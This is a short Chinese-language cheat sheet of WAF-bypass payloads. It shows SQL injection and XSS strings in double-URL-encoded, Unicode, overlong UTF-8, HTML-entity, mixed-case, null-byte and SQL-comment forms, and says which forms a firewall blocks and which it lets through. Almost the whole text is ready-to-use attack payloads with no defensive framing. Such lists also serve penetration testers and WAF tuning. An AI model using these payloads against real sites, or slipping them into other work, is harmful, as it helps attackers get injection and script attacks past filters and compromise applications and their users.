# 编码绕过 Payload
## 1.1 双重 URL 编码

WAF 解码一次，后端解码两次：

```
原始: ' OR '1'='1
单次编码: %27%20OR%20%271%27%3D%271     → WAF 拦截
双重编码: %2527%2520OR%2520%25271%2527%253D%25271  → WAF 放行
```

## 1.2 Unicode / UTF-8 编码

```
原始: <script>
IIS Unicode: %u003cscript%u003e
UTF-8 overlong: %c0%bc%c1%b3%c1%b2%c1%a9%c1%b0%c1%b4%c0%be
Unicode normalization: ＜script＞（全角字符）
```

## 1.3 HTML 实体编码

```
原始: <img src=x onerror=alert(1)>
HTML: &lt;img src=x onerror=alert(1)&gt;
十进制: &#60;img src=x onerror=alert(1)&#62;
十六进制: &#x3c;img src=x onerror=alert(1)&#x3e;
```

## 1.4 混合编码

```
# 大小写混合
UnIoN SeLeCt
<ScRiPt>alert(1)</ScRiPt>

# NULL 字节
UN%00ION SELECT
<scr%00ipt>

# 注释混淆（SQL）
UN/**/ION/**/SEL/**/ECT
1'/*!50000UNION*//*!50000SELECT*/1,2,3--
```
